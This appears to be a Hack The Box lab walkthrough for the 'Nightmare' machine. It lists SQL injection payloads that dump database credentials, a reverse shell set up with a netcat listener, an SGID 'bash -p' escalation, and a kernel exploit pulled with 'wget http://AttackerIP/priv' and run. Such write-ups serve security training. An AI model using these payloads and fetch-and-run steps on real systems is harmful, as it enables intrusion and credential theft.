# HacktheBox Machine: Nightmare 
**Penetration Methodology**
  * [Network scanning ](#network-scanning)
  * [Browsing IP address through HTTP](#browsing-ip-address-through-http)
  * [Checking for SQL injection vulnerability](#checking-for-sql-injection-vulnerability)
  * [Exploiting Second-Order Injection](#exploiting-second-order-injection)
  * [Login through SSH](#login-through-ssh)
  * [Login through SFTP](#login-through-sftp)
  * [SFTP Reverse Shell](#sftp-reverse-shell)
  * [Discovering files with SGID bit set](#discovering-files-with-sgid-bit-set)
  * [Privilege escalation using sls](#privilege-escalation-using-sls)
  * [Finding exploit for kernel](#finding-exploit-for-kernel)
  * [Transfer exploit to target](#transfer-exploit-to-target)
  * [Getting root privilege](#getting-root-privilege)
  * [Getting the root flag](#getting-the-root-flag)
  
 
 ## Network Scanning
  * nmap -sC -sV 10.10.10.66 revealed ports http/80 and ssh/2222 are open.

## Browsing IP address through HTTP
  * Login page available, however, no php pages were visible in the URL
  
## Checking for SQL Injection vulnerability
  * The page is vulnerable to [Second Order SQL Injection](https://medium.com/@fiddlycookie/the-wrath-of-second-order-sql-injection-c9338a51c6d).
  * Meaning, to exploit this vulnerability we have to register a user with
    the SQL injection and then login with the same username.
    
## Exploiting Second-Order Injection
  * Register a user with the credentials: 
  *  * **"admin'): pass"**
  * Find number of columns in database by registering another user: 
  *  * **"admin')order by 2#"**
  * No SQL error messages, meaning the table has 2 columns,
  * Find the version of SQL DB. Register another user: 
     * **"admin') UNION SELECT 1,@@version#"**
  * MySQL DB confirmed. Now find the name of the database:
     * **"admin') UNION SELECT 1,database()#"**
     * Name of DB is "notes"
  * Get all DB names on server:
     * **admin') union select 1,group_concat(distinct table_schema) from information_schema.tables#**
     * This results in: information_schema, notes, sysadmin
     
  * Find the table names within sysadmin:
     * **admin') union select 1,group_concat(distinct table_name) from information_schema.columns where    table_schema="sysadmin"#**
     * Tables: configs, users
     
  * Find column names:
     * **admin') union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema="sysadmin" and table_name="users"#**
     * password, username
     
  * Find data inside the password and username fields:
     * **admin') union select 1,group_concat(username,0x7c,password,0x0a) from sysadmin.users#**
     * This will list all the username and passwords
     
## Login through SSH
   * SSH Login failed
## Login through SFTP
   * SFTP login succeeded: **sftp -p 2222 ftpuser@10.10.10.66**

## SFTP Reverse Shell
   * [Exploit script](https://www.hackingarticles.in/hack-the-box-nightmare-walkthrough/)
   * Change the following lines to...
      * cmd = 'python3 -c import pty; pty.spawn("/bin/bash")'
      * host = '10.10.10.66'
      * port = 4545
      * username = 'ftpuser'
      * password = '@whereyougo?'
   * python3 sftp-exploit.py
   * set the netcat listener: **nc -lvp 443**
   * Break out of the shell: **python3 -c import pty; pty.spawn("/bin/bash")**
   
## Discovering files with SGID bit set
  * List the contents of directory, there is a decoder directory present.
  * cd into decoder, perform ls -al. We see that user.txt and the user directory are in the decoder group.
  * Find all files in belonging to the **decoder** group
      * **find / -group "decoder" 2>/dev/null**
      * sls is a binary file running the ls command.
      
## Privilege escalation using sls
  * Use the [strings](https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/) command to read the binary    file
      * **strings /usr/bin/sls**
      * **sls -b**.  <- sls is just a depracted form of "ls"
      * **bash -p**
  * Running **id**, we see that we've spawned a shell as the "decoder" user.
  * cat the user.txt to get the flag

## Finding exploit for kernel
   * Verify kernel
      * **uname -a**
   * [Exploit Script](https://www.exploit-db.com/exploits/43418)
   
## Transfer exploit to target
   * **gcc -o priv 4318.c**
   * **python -m SimpleHTTPServer 80**
  
   * On Target:
   * wget http://AttackerIP/priv
   * chmod +x priv
   * ./priv
   
## Getting root privilege
   * Exit decoder and run the ./priv as ftpuser
   * ./priv

## Getting the root flag
   * Navigate to the root folder
   * cat the root.txt file.
   
